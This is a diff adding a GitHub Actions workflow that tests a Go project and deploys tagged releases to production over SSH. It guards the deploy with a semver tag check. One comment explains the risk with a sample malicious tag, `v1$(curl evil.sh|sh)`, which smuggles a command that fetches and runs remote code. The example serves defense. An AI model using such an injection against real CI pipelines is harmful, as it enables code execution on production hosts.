@@ -1,0 +1,62 @@
+name: deploy-prod
+
+on:
+  push:
+    tags:
+      - "v*"
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+    steps:
+      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4
+      - uses: actions/setup-go@40f1582b2485089dde7abd97c1529aa768e1baff # v5
+        with:
+          go-version-file: go.mod
+      - run: go vet ./...
+      - run: go test ./...
+
+  deploy:
+    needs: test
+    runs-on: ubuntu-latest
+    environment: production
+    permissions:
+      contents: read
+    steps:
+      # github.ref_name comes from the pushed tag and would otherwise be
+      # interpolated straight into the remote SSH shell command below
+      # (appleboy/ssh-action's `script:` runs on the deploy host, not this
+      # runner). A tag crafted with shell metacharacters — e.g.
+      # `v1$(curl evil.sh|sh)` — could execute arbitrary commands on the
+      # production host. Reject anything that isn't a plain semver tag
+      # before it reaches the SSH step.
+      - name: Validate tag format
+        env:
+          DEPLOY_TAG: ${{ github.ref_name }}
+        run: |
+          if [[ ! "$DEPLOY_TAG" =~ ^v[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
+            echo "::error::refusing to deploy: tag '$DEPLOY_TAG' does not match ^v[0-9]+\.[0-9]+\.[0-9]+\$"
+            exit 1
+          fi
+      - name: Deploy over SSH
+        uses: appleboy/ssh-action@029f5b4aeeeb58fdfe1410a5d17f967dacf36262 # v1.0.3
+        env:
+          DEPLOY_TAG: ${{ github.ref_name }}
+        with:
+          host: ${{ secrets.SSH_HOST }}
+          username: ${{ secrets.SSH_USER }}
+          key: ${{ secrets.SSH_KEY }}
+          port: ${{ secrets.SSH_PORT || 22 }}
+          envs: DEPLOY_TAG
+          script: |
+            set -e
+            cd "${{ secrets.DEPLOY_PATH }}"
+            git fetch --tags origin
+            git checkout "$DEPLOY_TAG"
+            make up-prod
